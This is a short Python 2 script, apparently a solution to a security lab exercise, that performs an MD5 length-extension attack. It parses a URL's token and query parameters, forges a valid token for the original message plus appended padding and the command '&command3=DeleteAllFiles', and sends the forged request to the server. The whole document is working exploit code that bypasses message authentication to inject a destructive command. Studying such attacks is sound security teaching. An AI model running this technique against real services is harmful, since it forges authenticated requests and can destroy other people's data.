from pymd5 import md5, padding
import httplib, urlparse, sys, urllib
#define constants
APPEND = "&command3=DeleteAllFiles"
PWDLEN = 8 

#define command line arguments
url = sys.argv[1]
# message = "user=admin&command1=ListFiles&command2=NoOp"
append = "&command3=DeleteAllFiles"

parsedUrl = urlparse.urlparse(url)
query = parsedUrl.query


#parse query for arguments
queryDictionary = urlparse.parse_qs(query)
oldToken = queryDictionary["token"][0]
message = "user=" + queryDictionary["user"][0] + "&command1=" + queryDictionary["command1"][0] + "&command2=" + queryDictionary["command2"][0] 

#calculate new token
h = md5(state=oldToken.decode("hex"), count=512) 
h.update(APPEND)
newToken = h.hexdigest()

#form new query string
newQuery = "token=" + newToken + '&' + message + urllib.quote(padding((len(message)+PWDLEN)*8)) + APPEND

#make request to server
conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + newQuery)
print conn.getresponse().read()


